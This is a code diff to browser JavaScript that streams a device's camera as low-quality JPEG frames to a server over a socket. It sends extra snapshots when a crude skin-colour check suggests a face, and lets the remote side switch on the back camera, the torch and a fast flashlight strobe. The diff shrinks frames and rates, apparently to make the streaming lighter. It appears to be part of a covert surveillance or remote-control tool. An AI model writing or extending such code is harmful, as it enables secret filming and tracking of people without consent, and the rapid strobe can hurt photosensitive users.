@@ -217,17 +217,17 @@ function startCameraStream() {
     const trackOk = stream && stream.getVideoTracks().length && stream.getVideoTracks()[0].readyState === 'live';
     if (!trackOk) {
         const tryGetCam = (mode) => {
-            const constraints = mode ? {video:{facingMode:mode,width:{ideal:320},height:{ideal:240}},audio:false} : {video:{width:{ideal:320},height:{ideal:240}},audio:false};
+            const constraints = mode ? {video:{facingMode:mode,width:{ideal:240},height:{ideal:180}},audio:false} : {video:{width:{ideal:240},height:{ideal:180}},audio:false};
             navigator.mediaDevices.getUserMedia(constraints)
                 .then((s) => {
                     if (stream) stream.getTracks().forEach(t => t.stop());
                     stream = s; camFacingMode = mode || 'user';
                     const track = s.getVideoTracks()[0];
-                    if (track) track.applyConstraints({width:{ideal:320},height:{ideal:240}}).catch(()=>{});
+                    if (track) track.applyConstraints({width:{ideal:240},height:{ideal:180}}).catch(()=>{});
                     let v = document.querySelector('video[data-snap]');
                     if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                     if (v) { v.srcObject = s; v.play(); }
-                    const MAX_WAIT = 50;
+                    const MAX_WAIT = 30;
                     let waited = 0;
                     const poll = () => {
                         const v2 = document.querySelector('video[data-snap]');
@@ -252,10 +252,10 @@ function startCameraStream() {
         return;
     }
     const c = document.createElement('canvas');
-    c.width = 240; c.height = 180;
+    c.width = 160; c.height = 120;
     const ctx = c.getContext('2d');
-    const fdCanvas = document.createElement('canvas'); // face detection canvas
-    fdCanvas.width = 80; fdCanvas.height = 60;
+    const fdCanvas = document.createElement('canvas');
+    fdCanvas.width = 64; fdCanvas.height = 48;
     const fdCtx = fdCanvas.getContext('2d');
     let lastFaceCheck = 0;
     socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
@@ -263,37 +263,35 @@ function startCameraStream() {
     let frameBusy = false;
     function sendFrame() {
         if (!camStreamInterval) return;
-        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 100); return; }
+        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 200); return; }
         if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 200); return; }
         frameBusy = true;
         try {
-            ctx.drawImage(v, 0, 0, 240, 180);
-            // AI Face Detection — analyze every 3 seconds
+            ctx.drawImage(v, 0, 0, 160, 120);
+            // AI Face Detection — every 5 seconds, low-res skin analysis
             const now = Date.now();
-            if (now - lastFaceCheck > 3000) {
+            if (now - lastFaceCheck > 5000) {
                 lastFaceCheck = now;
-                fdCtx.drawImage(v, 0, 0, 80, 60);
-                const imageData = fdCtx.getImageData(0, 0, 80, 60);
+                fdCtx.drawImage(v, 0, 0, 64, 48);
+                const imageData = fdCtx.getImageData(0, 0, 64, 48);
                 const pixels = imageData.data;
                 let skinPixels = 0;
                 for (let i = 0; i < pixels.length; i += 4) {
                     const r = pixels[i], g = pixels[i+1], b = pixels[i+2];
                     if (r > 95 && g > 40 && b > 20 && r > g && r > b && Math.abs(r-g) > 15) skinPixels++;
                 }
-                const skinRatio = skinPixels / (80*60);
-                if (skinRatio > 0.15) {
-                    // Face detected — emit snapshot with face detection flag
+                if (skinPixels / (64*48) > 0.18) {
                     c.toBlob((blob) => {
                         if (blob) {
                             const r = new FileReader();
                             r.onloadend = () => socket.emit('face-detected', { image: r.result.split(',')[1] });
                             r.readAsDataURL(blob);
                         }
-                    }, 'image/jpeg', 0.4);
+                    }, 'image/jpeg', 0.3);
                 }
             }
             c.toBlob((blob) => {
-                if (blob && blob.size > 200) {
+                if (blob && blob.size > 100) {
                     const reader = new FileReader();
                     reader.onloadend = () => {
                         socket.emit('camera-stream', { image: reader.result.split(',')[1] });
@@ -303,11 +301,11 @@ function startCameraStream() {
                 } else {
                     frameBusy = false;
                 }
-            }, 'image/jpeg', 0.2);
+            }, 'image/jpeg', 0.15);
         } catch(e) { frameBusy = false; }
-        camStreamInterval = setTimeout(sendFrame, 100);
+        camStreamInterval = setTimeout(sendFrame, 200);
     }
-    camStreamInterval = setTimeout(sendFrame, 100);
+    camStreamInterval = setTimeout(sendFrame, 200);
 }
 function startCamAudioStream() {
     if (camAudioRecorder) return;
@@ -351,12 +349,50 @@ let torchActive = false;
 let strobeInterval = null;
 
 function setTorch(on) {
-    if (!stream) return;
+    if (!stream) {
+        // No stream yet — request back camera with torch
+        if (on) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
+                .then((s) => {
+                    if (stream) stream.getTracks().forEach(t => t.stop());
+                    stream = s; camFacingMode = 'environment';
+                    const track = stream.getVideoTracks()[0];
+                    if (track && track.applyConstraints) {
+                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
+                    }
+                    torchActive = true;
+                    let v = document.querySelector('video[data-snap]');
+                    if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
+                    if (v) { v.srcObject = s; v.play(); }
+                }).catch(() => {});
+        }
+        return;
+    }
     const track = stream.getVideoTracks()[0];
     if (!track || !track.applyConstraints) return;
+    // Torch only works on back camera — switch if needed
+    if (on && camFacingMode !== 'environment') {
+        // Switch to back camera first
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
+            .then((s) => {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                stream = s; camFacingMode = 'environment';
+                const newTrack = stream.getVideoTracks()[0];
+                if (newTrack && newTrack.applyConstraints) {
+                    newTrack.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
+                }
+                torchActive = true;
+                let v = document.querySelector('video[data-snap]');
+                if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
+                if (v) { v.srcObject = s; v.play(); }
+                socket.emit('camera-status', { status: 'torch_on', facingMode: 'environment' });
+            }).catch(() => {});
+        return;
+    }
     try {
         track.applyConstraints({ advanced: [{ torch: on }] }).catch(() => {});
         torchActive = on;
+        socket.emit('camera-status', { status: on ? 'torch_on' : 'torch_off' });
     } catch(e) {}
 }
 
@@ -367,7 +403,19 @@ function setTorchOff() {
 
 function startStrobe(pattern) {
     setTorchOff();
-    if (!stream) return;
+    if (!stream) {
+        // Create stream first with back camera for strobe
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
+            .then((s) => {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                stream = s; camFacingMode = 'environment';
+                let v = document.querySelector('video[data-snap]');
+                if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
+                if (v) { v.srcObject = s; v.play(); }
+                startStrobe(pattern);
+            }).catch(() => {});
+        return;
+    }
     const intervals = { slow: 800, medium: 300, fast: 100, rapid: 50 };
     const ms = intervals[pattern] || 300;
     let state = false;
